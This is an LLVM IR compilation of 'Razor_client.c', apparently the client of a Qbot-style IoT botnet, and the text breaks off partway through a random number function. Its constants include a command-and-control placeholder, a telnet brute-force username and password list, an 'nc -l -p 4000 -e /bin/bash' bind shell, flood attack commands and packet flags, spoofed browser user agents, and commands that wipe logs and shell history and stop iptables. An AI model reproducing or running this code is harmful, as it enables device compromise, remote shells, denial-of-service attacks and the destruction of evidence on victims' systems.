; ModuleID = 'Razor_client.c'
source_filename = "Razor_client.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.state_t.4 = type { i32, i8 }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@.str = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@infectline = dso_local global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i32 0, i32 0), align 8
@.str.1 = private unnamed_addr constant [8 x i8] c"IP:PORT\00", align 1
@commServer = dso_local global [1 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0)], align 8
@.str.2 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.3 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.4 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.5 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.6 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.7 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.8 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.9 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.10 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.11 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.12 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.13 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.14 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.15 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.16 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.17 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.18 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.19 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.20 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.21 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.22 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.23 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.24 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.25 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.26 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.27 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.28 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.29 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.30 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.31 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.32 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.33 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.34 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.35 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.36 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.37 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@uastrings = dso_local global [36 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.37, i32 0, i32 0)], align 16
@mainCommSock = dso_local global i32 0, align 4
@currentServer = dso_local global i32 -1, align 4
@gotIP = dso_local global i32 0, align 4
@numpids = dso_local global i64 0, align 8
@macAddress = dso_local global [6 x i8] zeroinitializer, align 1
@.str.38 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.39 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.40 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.41 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.42 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.44 = private unnamed_addr constant [9 x i8] c"netgear\00\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c"cisco\00\00", align 1
@.str.46 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.47 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.48 = private unnamed_addr constant [15 x i8] c"Administrator\00\00", align 1
@.str.49 = private unnamed_addr constant [9 x i8] c"comcast\00\00", align 1
@.str.50 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.51 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.52 = private unnamed_addr constant [8 x i8] c"D-Link\00\00", align 1
@.str.53 = private unnamed_addr constant [9 x i8] c"manager\00\00", align 1
@.str.54 = private unnamed_addr constant [4 x i8] c"pi\00\00", align 1
@.str.55 = private unnamed_addr constant [7 x i8] c"VTech\00\00", align 1
@.str.56 = private unnamed_addr constant [9 x i8] c"vagrant\00\00", align 1
@usernames = dso_local global [19 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.56, i32 0, i32 0)], align 16
@.str.57 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.58 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.60 = private unnamed_addr constant [11 x i8] c"raspberry\00\00", align 1
@.str.61 = private unnamed_addr constant [15 x i8] c"vagrant\00, 123\00\00", align 1
@.str.62 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.63 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"test\00\00", align 1
@passwords = dso_local global [26 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0)], align 16
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.65 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.66 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.67 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.68 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.69 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.70 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.71 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@pids = dso_local global i32* null, align 8
@.str.72 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@.str.73 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@ourIP = dso_local global %struct.in_addr zeroinitializer, align 4
@.str.74 = private unnamed_addr constant [45 x i8] c"screen -dmSL asdf nc -l -p 4000 -e /bin/bash\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.76 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.77 = private unnamed_addr constant [38 x i8] c"[RAZOR] \1B[34mATTEMPT \1B[37m-> %s:%s:%s\00", align 1
@.str.78 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.79 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.80 = private unnamed_addr constant [39 x i8] c"[RAZOR] \1B[32mEXECUTED \1B[37m-> %s:%s:%s\00", align 1
@.str.81 = private unnamed_addr constant [43 x i8] c"[RAZOR] \1B[31mUNSUCCESSFUL \1B[37m-> %s:%s:%s\00", align 1
@.str.82 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.84 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.86 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.87 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.88 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.89 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.90 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.91 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.92 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.93 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.94 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.95 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@scanPid = dso_local global i32 0, align 4
@.str.96 = private unnamed_addr constant [24 x i8] c"STOPPING TELNET SCANNER\00", align 1
@.str.97 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.98 = private unnamed_addr constant [24 x i8] c"STARTING TELNET SCANNER\00", align 1
@.str.99 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.100 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.101 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.102 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.103 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.104 = private unnamed_addr constant [6 x i8] c"COMBO\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.106 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.107 = private unnamed_addr constant [8 x i8] c"GTFOFAG\00", align 1
@.str.108 = private unnamed_addr constant [8 x i8] c"FATCOCK\00", align 1
@.str.109 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.110 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.111 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.112 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.113 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.114 = private unnamed_addr constant [11 x i8] c"history -w\00", align 1
@.str.115 = private unnamed_addr constant [16 x i8] c"killall -9 perl\00", align 1
@.str.116 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.117 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.118 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.119 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.120 = private unnamed_addr constant [6 x i8] c"RAZER\00", align 1
@.str.121 = private unnamed_addr constant [19 x i8] c"/usr/sbin/dropbear\00", align 1
@.str.122 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.123 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.124 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.125 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.126 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.127 = private unnamed_addr constant [6 x i8] c"DUPPP\00", align 1
@.str.128 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.129 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.130 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.131 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.132 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @init_rand(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

10:                                               ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

13:                                               ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

31:                                               ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10, !llvm.loop !6

34:                                               ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

29:                                               ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
